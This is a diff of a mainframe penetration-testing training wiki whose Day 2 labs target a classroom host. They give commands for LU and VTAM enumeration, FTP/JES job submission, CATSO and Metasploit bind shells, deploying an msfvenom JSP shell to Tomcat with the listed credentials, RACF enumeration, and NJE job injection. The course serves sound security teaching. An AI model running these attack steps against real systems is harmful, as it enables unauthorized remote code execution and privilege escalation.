@@ -145,6 +145,8 @@ Error message and password prompt
 
 <li>$:/SiteTitle</li>
 
+<li>$:/state/folded/Lab 2 - Headless Interaction</li>
+
 <li>$:/state/tab/sidebar--1835078512</li>
 
 <li>$:/StoryList</li>
@@ -159,19 +161,19 @@ Error message and password prompt
 
 <li>Lab 1 - Enumeration</li>
 
-<li>Lab 2 - Headless Interaction</li>
+<li>Lab 2 - FTP Code Execution</li>
 
-<li>Lab 3 - CICSpwn and CICS fun</li>
+<li>Lab 3 - Metasploit &amp; Tomcat</li>
 
-<li>Lab 4 - FTP Code Execution</li>
+<li>Lab 4 - z/OS Enumeration</li>
 
 <li>Lab 5 - Hacking Tomcat</li>
 
-<li>Lab 5 - Metasploit &amp; Tomcat</li>
+<li>Lab 5 - NJE Privesc</li>
 
-<li>Lab 6 - z/OS Enumeration</li>
+<li>OLD - Lab 2 - Headless Interaction</li>
 
-<li>Lab 7 - NJE Privesc</li>
+<li>OLD Lab 3 - CICSpwn and CICS fun</li>
 
 </ul>
 </p>
@@ -8739,10 +8741,13 @@ Error message and password prompt
 <div created="20181014015629802" modified="20181014015630851" title="$:/SiteTitle">
 <pre>Day 2 Labs</pre>
 </div>
+<div created="20201023043526167" modified="20201023043532375" title="$:/state/folded/Lab 2 - Headless Interaction">
+<pre>show</pre>
+</div>
 <div created="20181014055436789" modified="20181113215803257" title="$:/state/tab/sidebar--1835078512">
 <pre>$:/core/ui/SideBar/Open</pre>
 </div>
-<div list="[[Lab 1 - Enumeration]] [[Lab 2 - Headless Interaction]] [[Lab 3 - CICSpwn and CICS fun]] [[Lab 4 - FTP Code Execution]] [[Lab 5 - Metasploit &amp; Tomcat]] [[Lab 6 - z/OS Enumeration]] [[Lab 7 - NJE Privesc]]" title="$:/StoryList">
+<div list="[[Lab 1 - Enumeration]] [[Lab 2 - FTP Code Execution]] [[Lab 3 - Metasploit &amp; Tomcat]] [[Lab 4 - z/OS Enumeration]] [[Lab 5 - NJE Privesc]]" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -8758,7 +8763,7 @@ Error message and password prompt
         },
         &quot;$:/info/url/full&quot;: {
             &quot;title&quot;: &quot;$:/info/url/full&quot;,
-            &quot;text&quot;: &quot;file:///Users/phil/EvilMF/Labs/Day_2/Day2_Labs.html&quot;
+            &quot;text&quot;: &quot;file:///home/evilmf/Labs/Day_2/Day2_Labs.html&quot;
         },
         &quot;$:/info/url/host&quot;: {
             &quot;title&quot;: &quot;$:/info/url/host&quot;,
@@ -8778,7 +8783,7 @@ Error message and password prompt
         },
         &quot;$:/info/url/pathname&quot;: {
             &quot;title&quot;: &quot;$:/info/url/pathname&quot;,
-            &quot;text&quot;: &quot;/Users/phil/EvilMF/Labs/Day_2/Day2_Labs.html&quot;
+            &quot;text&quot;: &quot;/home/evilmf/Labs/Day_2/Day2_Labs.html&quot;
         },
         &quot;$:/info/url/search&quot;: {
             &quot;title&quot;: &quot;$:/info/url/search&quot;,
@@ -8790,11 +8795,11 @@ Error message and password prompt
         },
         &quot;$:/info/browser/screen/width&quot;: {
             &quot;title&quot;: &quot;$:/info/browser/screen/width&quot;,
-            &quot;text&quot;: &quot;1280&quot;
+            &quot;text&quot;: &quot;1920&quot;
         },
         &quot;$:/info/browser/screen/height&quot;: {
             &quot;title&quot;: &quot;$:/info/browser/screen/height&quot;,
-            &quot;text&quot;: &quot;800&quot;
+            &quot;text&quot;: &quot;1107&quot;
         }
     }
 }</pre>
@@ -8911,107 +8916,55 @@ Error message and password prompt
     }
 }</pre>
 </div>
-<div created="20181014031150411" modified="20191120065248499" tags="" title="Lab 1 - Enumeration">
+<div created="20181014031150411" modified="20201023053649216" tags="" title="Lab 1 - Enumeration">
 <pre>!!''Before Starting - Update''
 * Make sure you have the most up do date labs
 * Update the labs folder:
-* type `git pull` in the `/root/Labs` folder
-* Update the Tools folder: `cd Tools` then `./update_submodule.sh`
-** Note this may take a while
-
+* type `git pull` in the `~/Labs` folder
 * Reload this Wiki by closing your browser and reopening the file
 
 !!''Lab Objectives''
 # Learning how to obtain Logical Unit (LU)
 # Using s3270 to enumerate LUs
 # Using Nmap to enumerate VTAM application IDs
+# Using Nmap to gather CICS information
 # Optional: Enumerate CICS transaction IDs
 
 !!''Logical Unit Enumeration''
 
 !!!''Obtain LU name''
 
-There are two ways to get this information with the python library tn3270lib:
 
-1) `connected_lu()`
+* Using nmap: `nmap evilmf.evilmainframe.com -p 992 --script tn3270-screen` and look for `logical unit:`
+* Using `tn3270lib`:
 
 ```
-$ cd Labs/Tools
-$ ./update_submodule.sh
-$ cd tn3270lib
+$ cd ~/Tools/tn3270lib
 $ python
 &gt;&gt;&gt; import tn3270lib
 &gt;&gt;&gt; tn3270 = tn3270lib.TN3270()
-&gt;&gt;&gt; tn3270.initiate(&quot;evilmf&quot;,992)
+&gt;&gt;&gt; tn3270.initiate(&quot;evilmf.evilmainframe.com&quot;,992)
 True
 &gt;&gt;&gt; tn3270.connected_lu
 '&lt;Lu Name&gt;'
 &gt;&gt;&gt;
 ```
+* Are the logical units the same each time? 
+* Why would they change?
 
-2) Through Debugging:
-
-```
-&gt;&gt;&gt; import tn3270lib
-&gt;&gt;&gt; tn3270 = tn3270lib.TN3270()
-&gt;&gt;&gt; tn3270.set_debuglevel(1)
-&gt;&gt;&gt; tn3270.initiate(&quot;evilmf&quot;,992)
-```
-
-(read through messages until you see 'LU Name: xxxxx')
-
-!!!''Enumerating LUs''
-
-Use s3270 and bash to enumerate Logical Units. 
-
-* ''NOTE'' this is a service on a different port (42924) so the LU will be ''different'' than the lab above
-
-```
-#!/bin/bash
-echo &quot;[+] Getting LUs&quot;
-host=&quot;evilmf&quot;
-port=&quot;42924&quot;
-echo &quot;&gt;&gt; Using: L:$host:$port&quot;
-for i in `seq 40 60`
-do
-  LU=$(echo HCKRLU$i)
-  echo &quot;&gt;&gt; Trying L:$LU@$host:$port&quot;
-  s3270 -noverifycert &quot;L:$LU@$host:$port&quot; &lt;&lt; EOF
-Wait(1,Seconds)
-PrintText(file,&quot;$LU.txt&quot;)
-Disconnect
-EOF
-done 
-```
-
-Save it as `enum_lu.sh` and run it: `bash ./enum_lu.sh` or `chmod +x enum_lu.sh;./enum_lu.sh`
-
-''NOTICE'' the use of `-noverifycert` flag when using s3270, this will come in handy in another lab
-
-!!!''Review Results:''
-
-* Use a bash for loop in the linux terminal to review the results:
-
-```
-for i in H*.txt; do echo &quot;======= $i =======&quot;; cat $i; read; done
-```
-* Hit enter to cycle
-* Notice how it goes from the CICS `CSGM` transaction to a TSO Logon prompt `IKJ56700A ENTER USERID -`
-*  ''Note'' You might not grab a screenshot for all the LUs due to the class all doing it at the same time
-
-!!!''Doing this in Nmap''
-* use Nmap to identify the LU: `nmap --script tn3270-screen -sV -p 42924 evilmf`
+!!!''Enumerating LUs with Nmap''
+* use Nmap to identify the LU: `nmap --script +tn3270-screen -p 42924 evilmf.evilmainframe.com`
 ** Notice in the output it says `logical unit:`
-* Try enumerating with Nmap: `nmap --script lu-enum -p 42924 -sV evilmf`
+* Try enumerating with Nmap: `nmap --script +tn3270-screen,+lu-enum -p 42924 evilmf.evilmainframe.com -vv`
 
 !!''VTAM Application ID enumeration''
 
 * Use Nmap to enumerate application IDs
 * We do this to find any applications that may have lax security controls
 * Make sure you run this from the `~/Labs/Day_2/Lab_01` folder
-** Replace `/&lt;folder&gt;/` with a location you want to save screenshot of valid applications IDs
+** Replace `/&lt;folder&gt;/` in the command below with the location you want to save screenshot of valid applications IDs
 ```
-nmap -n -dd -vv -p &lt;port&gt; &lt;ip&gt; -sV \
+nmap -n -dd -vv -p 992 evilmf.evilmainframe.com -sV \
 --script vtam-enum \
 --script-args \
 vtam-enum.path=/&lt;folder&gt;/,\
@@ -9021,9 +8974,21 @@ brute.start=1,\
 brute.delay=1,\
 unpwdb.timelimit=0
 ```
+''Question'' What is the difference between the various application IDs you found?
+
+!!''Using Nmap to gather CICS information''
+* In the `~/Labs/Day_2/Lab_01` folder use the `cics-info.nse` script
+** The script in `/usr/local/share/nmap/scripts` is broken, waiting nmap team to approve pull request
+* Using `cics-info` script: 
+```
+nmap --script +/home/evilmf/Labs/Day_2/Lab_01/cics-info -p 992 evilmf.evilmainframe.com --script-args cics-info.user=&lt;username&gt;,cics-info.pass=&lt;password&gt;
+```
+
+''Question'' What is the version of z/OS? Who is the default user? What does the default user do for CICS?
+
 ---
 
-!!''OPTIONAL'': CICS Transaction ID Enumeration
+!!''Bonus'': CICS Transaction ID Enumeration
 This is optional. Please make sure brute.delay is set to a high number or you will get booted.
 
 * Read the Nmap script arguments very carefully
@@ -9042,9 +9007,327 @@ brute.delay=2,\
 cics-enum.path=/&lt;folder&gt;/
 ```
 
+!!!''Bonus: LU Enumeration with s3270''
+
+Only do this part of the lab if you have extra time, it is ''very'' slow
+
+Use s3270 and bash to enumerate Logical Units. 
+
+* ''⚠️NOTE⚠️'' this is a service on a different port (42924) so the LU will be ''different'' than the lab above
+
+Take the following bash script, copy it and save it as `enum_lu.sh`:
+
+```
+#!/bin/bash
+echo &quot;[+] Getting LUs&quot;
+host=&quot;evilmf.evilmainframe.com&quot;
+port=&quot;42924&quot;
+echo &quot;&gt;&gt; Using: L:$host:$port&quot;
+for i in `seq 40 60`
+do
+  LU=$(echo HCKRLU$i)
+  echo &quot;&gt;&gt; Trying L:$LU@$host:$port&quot;
+  s3270 -noverifycert &quot;L:$LU@$host:$port&quot; &lt;&lt; EOF
+Wait(1,Seconds)
+PrintText(file,&quot;$LU.txt&quot;)
+Disconnect
+EOF
+done 
+```
+
+Now run it: `bash ./enum_lu.sh` or `chmod +x enum_lu.sh;./enum_lu.sh`
+
+''NOTICE'' the use of `-noverifycert` in this script when using s3270, this will come in handy in another lab (hint hint)
+
+!!!''Review Results:''
+
+* Use a bash for loop in the linux terminal to review the results:
+
+```
+for i in H*.txt; do echo &quot;======= $i =======&quot;; cat $i; read; done
+```
+* Hit enter to cycle
+* Notice how it goes from the CICS `CSGM` transaction to a TSO Logon prompt `IKJ56700A ENTER USERID -`
+*  ''Note'' You might not grab a screenshot for all the LUs due to the class all doing it at the same time</pre>
+</div>
+<div created="20181014040322322" modified="20201023055128803" tags="" title="Lab 2 - FTP Code Execution">
+<pre>!!''Lab Objectives''
+# Edit JCL in linux
+# Use FTP to upload and run JCL
+# Use FTP to download job results
+# Use TShOcker to generate JCL with CATSO
+# Use FTP to run the generated JCL
+# Interact with CATSO to explore z/OS
+# Optional: Automate the process with TShOcker
+
+!!''JCL''
+
+Copy this JCL, edit it and put it in the linux filesystem
+
+* This is a refresher from yesterday
+* ''⚠️Note⚠️'': the jobcard is ''missing!'' 
+* A jobcard is the very first line (and its continuation) in a JCL file
+* You can copy/paste a jobcard from a previous lab (i.e. Day 1 LAB 1 or `&lt;userid&gt;.JCLLIB(LAB01)`). 
+* Follow the jobcard DOs and DONTs from the Notes wiki
+
+```
+//&lt;&lt;JOBCARD&gt;&gt;
+//SEARCH  EXEC PGM=ISRSUPC,
+//            PARM='SRCHCMP,ANYC'
+//NEWDD  DD DISP=SHR,DSN=EVIL.JCL
+//OUTDD  DD SYSOUT=*
+//SYSIN  DD *
+SRCHFOR  'IKJEFT'
+/*
+```
+
+!!''FTP Job Submission''
+Use FTP to execute JCL
+
+* Connect to ''evilmf.evilmainframe.com'' with FTP
+* Log on with username and password
+* Issue the FTP command `site FILE=JES`
+* Upload your JCL from previous section
+* Record `JOBnnnnn` where `nnnnn` is a number
+* Use the FTP command `ls` to list current job output
+* Download your job results `GET JOBnnnnn`
+
+!!''Get a CATSO Bind Shell''
+The following steps will execute some REXX code using JCL, REXX and FTP. 
+
+!!!''Generate the JCL''
+* Use ''TShOcker'' in the `~/Tools` folder to generate the JCL for you
+** replace `USERNAME` with your userid
+** replace `PASSWORD` with your password
+** replace `&lt;choose a port&gt;` with a random port between 20000-39999
+** if it fails you can read the help with `-h` and set it to connect with a reverse CATSO
+
+```
+./TShOcker.py -p 992 -l --lport &lt;choose a port&gt; --print evilmf.evilmainframe.com USERNAME PASSWORD &gt; ./JCL_REXX
+```
+
+* `--print` means 'Print the JCL' (instead of connecting directly with the script)
+* `-l` tells CATSO you want to setup CATSO in listener mode
+* `--lport` is the listening port you want CATSO to listen on
+
+!!!''Connect and Execute''
+
+* Using the same steps as above connect to `evilmf.evilmainframe.com` with FTP
+* Enter in to JES mode: `site FILE=JES`
+* Upload JCL_REXX: `PUT JCL_REXX`
+* Once the upload is complete connect with `ncat` to the port you chose to replace in `&lt;choose a port&gt;` with: `ncat -v evilmf.evilmainframe.com &lt;choose a port&gt;`
+** If netcat fails to connect, wait 30 seconds and try again. It may take up to a minute (or more depending on load) for the JCL to finish running
+
+''CATSO Commands''
+
+* Type `help` to get a list of commands
+* Try and run TSO commands `LU` and `SEARCH ALL WARNING NOMASK`
+* Try and get system information
+* Try and run USS (i.e. UNIX) commands
+* show the contents of a file: `cat evil##.rexxlib(lab01)`
+
+''Questions'' What is the name of this lpar? How many IP interfaces does it have? Where is the location of the RACF database? 
+
+''Harder Questions'': Can you see the job running in SDSF? What happens when you quit CATSO? Why did the job log disappear? 
+
+---
+!!''BONUS'' TShOcker
+
+Use ''TShOcker'' to automate this whole process and get a reverse CATSO connection back
+
+Use the `--help` flag and read the documentation to accomplish
+
+
+
 </pre>
 </div>
-<div created="20181014034708433" modified="20190515024254562" tags="" title="Lab 2 - Headless Interaction">
+<div created="20181014044107306" modified="20201023063812946" tags="" title="Lab 3 - Metasploit &amp; Tomcat">
+<pre>!!''Lab Objectives''
+# Use metasploit natively to obtain a reverse USS shell
+
+!!''Using Metasploit to Connect/Execute''
+* The  metasploit exploit `ftp_jcl_creds` uses the command `SITE FILE=JES` to run HLASM
+* The payload `bind_shell_jcl` is a bind Unix shell written in JCL and HLASM
+* ''RHOSTS'' is the target FTP server
+* ''LPORT'' tells metasploit which port to connect back to
+
+''Metasploit''
+
+* Launch metasploit: `msfconsole`
+* At `msf &gt;` prompt type: `use exploit/mainframe/ftp/ftp_jcl_creds`
+* Set the payload with `set payload cmd/mainframe/bind_shell_jcl`
+* Change the FTP User and password: `set FTPUSER &lt;user&gt;` . and `set FTPPASS &lt;password&gt;`
+* Set ''RHOST'' to evilmf: `set rhost evilmf.evilmainframe.com`
+* Set ''LPORT'' to a port between 20000 and 39999: `set lport &lt;port&gt;` e.g `set lport 22222`
+* Set ''LHOST'' to `0.0.0.0`: `set lhost 0.0.0.0`
+* Type `exploit` to launch the exploit and get a reverse shell
+
+''Questions'' 
+* What type of shell is this? 
+* Can you run TSO commands? Which ones? 
+* Can you cat a pds member, for example `EVIL##.REXXLIB(LAB01)`?
+
+---
+
+!''Hacking Tomcat''
+
+
+!!''Lab Objectives''
+# Using Nmap to find web servers
+# Using Metasploit to obtain a reverse shell using Tomcat
+# Using Unix commands to run TSO commands
+
+!!''Find the Tomcat Server''
+Use nmap, with default options and -sV to find the Tomcat server running:
+
+`nmap -sV evilmf.evilmainframe.com -p 8080`
+
+!!''Connect''
+* Open firefox and connect to the port identified in the previous step
+* `nikto` can easily find the credentials but to save you time:
+** ''Username:'' `tomcat`
+** ''Password:'' `gibson`
+
+!!!''WARNING!'' Please do not brute force this account as it will automatically lock everyone out - use the credentials above!
+
+!!''Get a Reverse Shell''
+* Use metasploit to generate a bind JSP shell
+* Replace `&lt;port between 20000-30000&gt;` and  `&lt;userid&gt;` with appropriate values
+```
+msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f war &gt; shell_&lt;userid&gt;.war
+```
+* With firefox browse to `http://evilmf.evilmainframe.com:8080/manager/html`
+** ''Username:'' `tomcat`
+** ''Password:'' `gibson`
+* In the section ''WAR file to deploy'' click `Browse...`
+** select the war file you created `shell_&lt;userid&gt;.war`
+* click `Deploy`
+* In the ''Applications'' section in the `Path` column find your deployed page `/shell_&lt;userid&gt;` and click that link
+* It might take a bit for the page to load
+* While its loading try connecting with ncat: `ncat evilmf &lt;your port&gt;`
+** It may take a few tries
+
+''Questions''
+
+* Can you run TSO commands?
+* Which user are you running commands as?
+* What ''attributes'' does this account have (hint, this needs a TSO RACF command)?
+* Can you cat a pds member, for example `EVIL##.REXXLIB(LAB01)`?</pre>
+</div>
+<div created="20181014052417597" modified="20201023063824849" tags="" title="Lab 4 - z/OS Enumeration">
+<pre>!!''Lab Objectives''
+# Use multiple methods to identify APF authorized libraries
+# Use REXX script to identify RACF configuration items
+# Use RACF `SEARCH` to identify what datasets you might have access to
+# Use REXX to identify current dataset concatenation
+
+!!''List APF Authorized Libraries''
+
+There are multiple ways to list the APF Authorized Libraries:
+
+* Use the script `EVIL.REXX(APF)`: `EX 'EVIL.REXX(APF)'`
+* Use the script `ENUM` in the `~/Tools/Enumeration` folder
+** Upload `ENUM` to your REXX library
+** execute it with `EX '&lt;userid&gt;.REXXLIB(ENUM)' 'APF'`
+
+!!''List out z/OS SETROPTS''
+* Try running the `SETROPTS LIST` command in TSO
+** It failed due to access rights!
+* Upload the script `ENUM` in the `~/Tools/Enumeration` folder to either a dataset or Unix
+* Using the script list out the security settings
+** TSO: `EX '&lt;userid&gt;.REXXLIB(ENUM)' 'SEC'`
+** Unix: `./ENUM SEC`
+
+''Questions''
+* What is the minimum password length?
+* Is KDFAES active? What does this mean?
+* ''Difficulty: Impossible'': Why does `ENUM` work when `SETROPTS LIST` fails?
+
+!!''Search the Dataset Class''
+* Use the RACF search command to find interesting rules
+* Command: `search class(dataset) filter(**) nomask`
+* Using `LD` determine your access to rules that have a `(G)`
+** `ld dataset('user.clist')`
+
+''Questions''
+* What does the `(G)` stand for?
+
+!!''Dataset Concatenation''
+* Upload the script `SYS0WN` in the `~/Tools/Enumeration` folder to `&lt;userid&gt;.REXXLIB`
+* Execute the script `EX '&lt;userid&gt;.REXXLIB(SYS0WN)'`
+* Do you have better than read to any of these?
+* What could you do if you did?</pre>
+</div>
+<div created="20181014050649961" modified="20190515034159680" tags="" title="Lab 5 - Hacking Tomcat">
+<pre>!!''Lab Objectives''
+# Using Nmap to find web servers
+# Using Metasploit to obtain a reverse shell using Tomcat
+# Using Unix commands to run TSO commands
+
+!!''Find the Tomcat Server''
+Use nmap, with default options and -sV to find the Tomcat server running:
+
+`nmap -sV evilmf -p 8080`
+
+!!''Connect''
+* Open firefox and connect to the port identified in the previous step
+* `nikto` can easily find the credentials but to save you time:
+** ''Username:'' `tomcat`
+** ''Password:'' `gibson`
+
+!!!''WARNING!'' Please do not brute force this account as it will automatically lock everyone out - use the credentials above!
+
+!!''Get a Reverse Shell''
+* Use metasploit to generate a bind JSP shell
+* Replace `&lt;port between 20000-30000&gt;` and  `&lt;userid&gt;` with appropriate values
+```
+msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f war &gt; shell_&lt;userid&gt;.war
+```
+* With firefox browse to `http://evilmf:8080/manager/html`
+** ''Username:'' `tomcat`
+** ''Password:'' `gibson`
+* In the section ''WAR file to deploy'' click `Browse...`
+** select the war file you created `shell_&lt;userid&gt;.war`
+* click `Deploy`
+* In the ''Applications'' section in the `Path` column find your deployed page `/shell_&lt;userid&gt;` and click that link
+* It might take a bit for the page to load
+* While its loading try connecting with ncat: `ncat evilmf &lt;your port&gt;`
+** It may take a few tries
+
+''Questions''
+
+* Can you run TSO commands?
+* Which user are you running commands as?
+* What ''attributes'' does this account have?</pre>
+</div>
+<div created="20190515034456720" modified="20201023063831728" tags="" title="Lab 5 - NJE Privesc">
+<pre>!!''Lab Objectives''
+# Use njelib to connect and submit a job
+# Identify OHOST and RHOST
+
+We've setup an insecure NJE connection on port 175
+
+* The //ohost// is ''CLASS''
+* The //rhost// is ''EVIL''
+
+!!''Display Jes2 Information''
+* go to `Labs/Tools/NJElib`
+* Install bitstring: `pip install bitstring`
+* run iNJEctor replacing `&lt;rhost&gt;` and `&lt;ohost&gt;` with the values above: `./iNJEctor.py evilmf &lt;ohost&gt; &lt;rhost&gt;  \$djes2`
+* Enable debugging if you want to see the NJE protocol in detail by adding `-d` before the ohost
+* ''NOTE'' if it fails keep trying, only one person can connect at a time
+* More command here: https://www.ibm.com/support/knowledgecenter/en/SSLTBW_2.3.0/com.ibm.zos.v2r3.hasa200/has2cmdr.htm
+** ''WARNING'' only use $D commands
+
+!!''Submit a job''
+* Edit the JCL `nop.jcl` in the folder `Labs/Tools/NJElib/JCL`
+* Replace `NEWYORK` with `EVIL`
+* Replace `NOTIFY=&amp;SYSUID` with `NOTIFY=&lt;your userid&gt;,USER=EVIL55`
+* run `jcl.py`: `./jcl.py CLASS EVIL evilmf JCL/nop.jcl EVIL55`
+
+</pre>
+</div>
+<div created="20181014034708433" modified="20201023043832120" tags="" title="OLD - Lab 2 - Headless Interaction">
 <pre>!!''Lab Objectives''
 # Use Python and s3270 to logon to the mainframe
 # Non-interactively issue the TSO command `LISTCAT`
@@ -9121,279 +9404,17 @@ String(&quot;$3\n&quot;)
 EOF
 ```</pre>
 </div>
-<div created="20190515024441464" modified="20190611012917299" tags="" title="Lab 3 - CICSpwn and CICS fun">
+<div created="20190515024441464" modified="20201023051457208" tags="" title="OLD Lab 3 - CICSpwn and CICS fun">
 <pre>!!''Lab Objectives''
 # Learning how to use CICSpwn
 # Using CICSpwn to list interesting transaction ID
 # Using Nmap to list CICS information
 
 !!''CICSpwn''
-* Go to `/root/Labs/Day_2/Lab_03` in Kali
-* install py3270 `pip install py3270`
-* ''NOTE'' CICWpwn requires a password, to prevent your neighbor seeing your password do: `echo &quot;your password&quot; &gt; pass.txt`
-* run CICSpwn to list CICS information `python2 ./cicspwn.py -A -U evil0 -P $(cat pass.txt) evilmf 992`
+* Go to `~/Tools/cicspwn` in Kali
+* ''⚠️ NOTE'' CICWpwn requires a password, to prevent your neighbor seeing your password do: `echo &quot;your password&quot; &gt; pass.txt`
+* run CICSpwn to list CICS information `python3 ./cicspwn.py -A -U evil## -P $(cat pass.txt) evilmf.evilmainframe.com 992`
 
-!!''Using Nmap to gather CICS info''
-* Nmap can also gather this information
-* In the `Labs/Day_2/Lab_03` folder use the `cics-info.nse` script (until nmap accepts the pull request)
-* You will have to overwrite the script in `/usr/local/share/nmap/scripts`
-* Using `cics-info` script: `/usr/local/bin/nmap --script +/root/Labs/Day_2/Lab_03/cics-info.nse -p 992 evilmf --script-args cics-info.user=&lt;&lt;USERID&gt;&gt;,cics-info.pass=&lt;&lt;password&gt;&gt; -dd -vv`
-</pre>
-</div>
-<div created="20181014040322322" modified="20190515031238301" tags="" title="Lab 4 - FTP Code Execution">
-<pre>!!''Lab Objectives''
-# Edit JCL in linux
-# Use FTP to upload and run JCL
-# Use FTP to download job results
-# Use TShOcker to generate JCL with CATSO
-# Use FTP to run the generated JCL
-# Interact with CATSO to explore z/OS
-# Optional: Automate the process with TShOcker
-
-!!''JCL''
-
-Copy this JCL, edit it and put it in the linux filesystem
-
-* This is a refresher from yesterday
-* ''NOTE:'' the jobcard is ''missing!'' 
-* A jobcard is the very first line (and its continuation) in a JCL file
-* You can copy/paste a jobcard from a previous lab (i.e. Day 1 LAB 1 or `&lt;userid&gt;.JCLLIB(LAB01)`). 
-* Follow the jobcard DOs and DONTs from the Notes wiki
-
-```
-//&lt;&lt;JOBCARD&gt;&gt;
-//SEARCH  EXEC PGM=ISRSUPC,
-//            PARM='SRCHCMP,ANYC'
-//NEWDD  DD DISP=SHR,DSN=EVIL.JCL
-//OUTDD  DD SYSOUT=*
-//SYSIN  DD *
-SRCHFOR  'IKJEFT'
-/*
-```
-
-!!''FTP Job Submission''
-Use FTP to execute JCL
-
-* Connect to ''evilmf'' with FTP in linux VM
-* Log on with username and password
-* Issue the FTP command `SITE FILE=JES`
-** If the command fails try lowercase `site`
-* Upload your JCL from previous section
-* Record `JOBnnnnn` where `nnnnn` is a number
-* Use the FTP command `ls` to list current job output
-* Download your job results `GET JOBnnnnn.X`
-
-!!''Get a CATSO Bind Shell''
-The following steps will execute some REXX code using JCL, REXX and FTP. 
-
-!!!''Generate the JCL''
-* Use ''TShOcker'' in the `Labs/Tools` folder to generate the JCL for you
-* replace `USERNAME` with your userid
-* replace `PASSWORD` with your password
-* replace `&lt;choose a port&gt;` with a random port above 1024
-** if it fails you can read the help with `-h` and set it to connect with a reverse CATSO
-
-```
-./TShOcker.py -p 992 -l --lport &lt;choose a port between 20000-40000&gt; --print evilmf USERNAME PASSWORD &gt; ./JCL_REXX
-```
-
-* `--print` means 'Print the JCL' (instead of connecting directly with the script)
-* `-l` tells CATSO you want to setup CATSO in listener mode
-* `--lport` is the listening port you want CATSO to listen on
-
-!!!''Connect and Exectue''
-
-* Using the same steps as above connect to evilmf with FTP
-* Enter in to JES mode: `SITE FILE=JES`
-* Upload JCL_REXX: `PUT JCL_REXX`
-* Once the upload is complete connect with netcat to the random port you chose to replace `&lt;choose a port&gt;` with: `nc -nv evilmf 46290`
-** If netcat fails to connect, wait 30 seconds and try again. It may take up to a minute (or more depending on load) for the JCL to finish running
-
-''CATSO Commands''
-
-* Type `help` to get a list of commands
-* Try and run TSO commands `LU` and `SEARCH ALL WARNING NOMASK`
-* Try and get system information
-* Try and run USS (i.e. UNIX) commands
-
----
-!!''OPTIONAL'' TShOcker
-
-Use ''TShOcker'' to automate this whole process and get a reverse CATSO connection back
-
-Use the `--help` flag and read the documentation to accomplish
-
-
-
-</pre>
-</div>
-<div created="20181014050649961" modified="20190515034159680" tags="" title="Lab 5 - Hacking Tomcat">
-<pre>!!''Lab Objectives''
-# Using Nmap to find web servers
-# Using Metasploit to obtain a reverse shell using Tomcat
-# Using Unix commands to run TSO commands
-
-!!''Find the Tomcat Server''
-Use nmap, with default options and -sV to find the Tomcat server running:
-
-`nmap -sV evilmf -p 8080`
-
-!!''Connect''
-* Open firefox and connect to the port identified in the previous step
-* `nikto` can easily find the credentials but to save you time:
-** ''Username:'' `tomcat`
-** ''Password:'' `gibson`
-
-!!!''WARNING!'' Please do not brute force this account as it will automatically lock everyone out - use the credentials above!
-
-!!''Get a Reverse Shell''
-* Use metasploit to generate a bind JSP shell
-* Replace `&lt;port between 20000-30000&gt;` and  `&lt;userid&gt;` with appropriate values
-```
-msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f war &gt; shell_&lt;userid&gt;.war
-```
-* With firefox browse to `http://evilmf:8080/manager/html`
-** ''Username:'' `tomcat`
-** ''Password:'' `gibson`
-* In the section ''WAR file to deploy'' click `Browse...`
-** select the war file you created `shell_&lt;userid&gt;.war`
-* click `Deploy`
-* In the ''Applications'' section in the `Path` column find your deployed page `/shell_&lt;userid&gt;` and click that link
-* It might take a bit for the page to load
-* While its loading try connecting with ncat: `ncat evilmf &lt;your port&gt;`
-** It may take a few tries
-
-''Questions''
-
-* Can you run TSO commands?
-* Which user are you running commands as?
-* What ''attributes'' does this account have?</pre>
-</div>
-<div created="20181014044107306" modified="20190612154550419" tags="" title="Lab 5 - Metasploit &amp; Tomcat">
-<pre>!!''Lab Objectives''
-# Use metasploit natively to obtain a reverse USS shell
-
-!!''Using Metasploit to Connect/Execute''
-* The  metasploit exploit `ftp_jcl_creds` uses the command `SITE FILE=JES` to run HLASM
-* The payload `bind_shell_jcl` is a bind Unix shell written in JCL and HLASM
-* ''RHOSTS'' is the target FTP server
-* ''LPORT'' tells metasploit which port to connect back to
-
-''Metasploit''
-
-* Launch metasploit: `msfconsole`
-* At `msf &gt;` prompt type: `use exploit/mainframe/ftp/ftp_jcl_creds`
-* Set the payload with `set payload cmd/mainframe/bind_shell_jcl`
-* Change the FTP User and password: `set FTPUSER &lt;user&gt;` . and `set FTPPASS &lt;password&gt;`
-* Set ''RHOST'' to evilmf: `set rhost evilmf`
-* Set ''LPORT'' to a port between 20000 and 40000: `set lport &lt;port&gt;` e.g `set lport 22222`
-* Enable Passive mode: `set PassiveMode true`
-* Type `exploit` to launch the exploit and get a reverse shell
-
----
-
-!''Hacking Tomcat''
-
-
-!!''Lab Objectives''
-# Using Nmap to find web servers
-# Using Metasploit to obtain a reverse shell using Tomcat
-# Using Unix commands to run TSO commands
-
-!!''Find the Tomcat Server''
-Use nmap, with default options and -sV to find the Tomcat server running:
-
-`nmap -sV evilmf -p 8080`
-
-!!''Connect''
-* Open firefox and connect to the port identified in the previous step
-* `nikto` can easily find the credentials but to save you time:
-** ''Username:'' `tomcat`
-** ''Password:'' `gibson`
-
-!!!''WARNING!'' Please do not brute force this account as it will automatically lock everyone out - use the credentials above!
-
-!!''Get a Reverse Shell''
-* Use metasploit to generate a bind JSP shell
-* Replace `&lt;port between 20000-30000&gt;` and  `&lt;userid&gt;` with appropriate values
-```
-msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f war &gt; shell_&lt;userid&gt;.war
-```
-* With firefox browse to `http://evilmf:8080/manager/html`
-** ''Username:'' `tomcat`
-** ''Password:'' `gibson`
-* In the section ''WAR file to deploy'' click `Browse...`
-** select the war file you created `shell_&lt;userid&gt;.war`
-* click `Deploy`
-* In the ''Applications'' section in the `Path` column find your deployed page `/shell_&lt;userid&gt;` and click that link
-* It might take a bit for the page to load
-* While its loading try connecting with ncat: `ncat evilmf &lt;your port&gt;`
-** It may take a few tries
-
-''Questions''
-
-* Can you run TSO commands?
-* Which user are you running commands as?
-* What ''attributes'' does this account have?</pre>
-</div>
-<div created="20181014052417597" modified="20190515040403170" tags="" title="Lab 6 - z/OS Enumeration">
-<pre>!!''Lab Objectives''
-# Use multiple methods to identify APF authorized libraries
-# Use REXX script to identify RACF configuration items
-# Use RACF `SEARCH` to identify what datasets you might have access to
-# Use REXX to identify current dataset concatenation
-
-!!''List APF Authorized Libraries''
